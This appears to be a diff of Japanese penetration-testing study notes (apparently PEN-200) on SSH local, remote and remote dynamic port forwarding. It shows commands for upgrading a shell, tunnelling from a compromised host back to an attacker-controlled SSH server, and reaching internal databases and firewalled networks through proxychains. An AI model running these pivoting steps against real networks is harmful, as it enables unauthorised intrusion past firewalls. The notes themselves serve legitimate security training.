@@ -113,6 +113,9 @@ $$SSHリモートポートフォワーディングのイメージ図$$
 
 - 概要：SSHサーバー側のポートを、ローカルマシン(SSHクライアント)経由で別のサーバーの任意ポートに転送する
 
+>[!TIP]
+>SSH Port Forwardingの中では**最も成功率が高い**ので、これを優先的に使う。
+
 ![](../../../画像ファイル/Pasted%20image%2020260314094922.png)
 
 $$SSHリモートダイナミックポートフォワーディングのイメージ図$$
@@ -126,7 +129,7 @@ $$SSHリモートダイナミックポートフォワーディングのイメー
 > - Local Port Forwardingはインバウンドトラフィックが許可されていないと使えないので失敗することが多い(SSHクライアントで任意のリッスンポートを開いても、攻撃者のマシンからのリッスンポートへの通信がFWで遮断される)
 > - →[SSH Remote Port Forwarding](#SSH%20Remote%20Port%20Forwarding)のほうが成功確率高い
 
-1. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
+1. SSHクライアント上で非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
@@ -160,7 +163,7 @@ tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*     
 - [SSH Local Port Forwarding](#SSH%20Local%20Port%20Forwarding)と同じく、現実では失敗する可能性が高い
 	- →[SSH Remote Dynamic Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)
 
-1. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
+1. SSHクライアント上で非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
@@ -218,14 +221,14 @@ tcp_connect_time_out 800
 sudo systemctl start ssh
 ```
 
-2. 非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
+2. SSHクライアント上で非インタラクティブシェルであれば、インタラクティブシェルへ切り替える
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 3. SSHクライアント上でリモートポートフォワーディング（出力はなし）
 ```zsh
-ssh -N -R 127.0.0.1:<SSH_server_listen_port>:<target_IP>:<Port><SSH_server_username(Attacker)>@<SSH_server_IP>
+ssh -N -R 127.0.0.1:<SSH_server_listen_port>:<target_IP>:<port><SSH_server_username(Attacker)>@<SSH_server_IP>
 ```
 
 4. 攻撃者のマシンでリモートポートフォワーディングが成功しているかどうかを確認
@@ -238,10 +241,7 @@ Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
 tcp   LISTEN 0      128        127.0.0.1:[listenport]      0.0.0.0:*
 ```
 
-![](../../../画像ファイル/Pasted%20image%2020250923181415.png)
-$$SSHリモートポートフォワーディングイメージ図(PEN-200)$$
-
-5. 攻撃者のマシンから攻撃者マシンのリッスンポートに接続することで、目的マシンのDestPortにアクセス可能
+5. 攻撃者のマシンから攻撃者マシンのリッスンポートに接続することで、Targetのportにアクセス可能
 ```zsh
 # 例：postgresql
 psql -h 127.0.0.1 -p 2345 -U postgres
@@ -254,8 +254,6 @@ ssh database_admin@127.0.0.1 -p 2222
 
 # SSH Remote Dynamic Port Forwarding
 
-SSH Port Forwardingの中では**最強**で、これを優先的に使う
-
 1. 攻撃者のマシンでSSHサーバーをスタートする
 ```zsh
 sudo systemctl start ssh
@@ -267,10 +265,9 @@ sudo systemctl start ssh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-3. SSHクライアント上でリモートダイナミックポートフォワーディング
-	- 出力はなし
+3. SSHクライアント上でリモートダイナミックポートフォワーディング（出力はなし）
 ```zsh
-ssh -N -R [SSH server LISTEN Port(1025以上任意)] [SSH server username(攻撃者)]@[SSH server IP]
+ssh -N -R <SSH_server_listen_port> <SSH_server_username(Attacker)>@<SSH_server_IP>
 ```
 - SSH serverのIPアドレスを渡す必要はなく、ポートだけ渡せば、デフォルトでSSHサーバーのループバックインターフェースにバインドされる
 
@@ -287,7 +284,8 @@ tcp   LISTEN  0       128              [::1]:9998           [::]:*     users:(("
 ```
 
 ![](../../../画像ファイル/Pasted%20image%2020250923184203.png)
-$$リモートダイナミックポートフォワーディングによって内部NWを列挙する図(PEN-200)$$
+
+$$リモートダイナミックポートフォワーディングによってFWを回避するイメージ$$
 
 5. 攻撃者のマシン上で、Proxychainsの設定を変更する
 	- ⚠️Proxychainsは関数をフックする仕組みを使うので、静的リンクされたバイナリには使えない
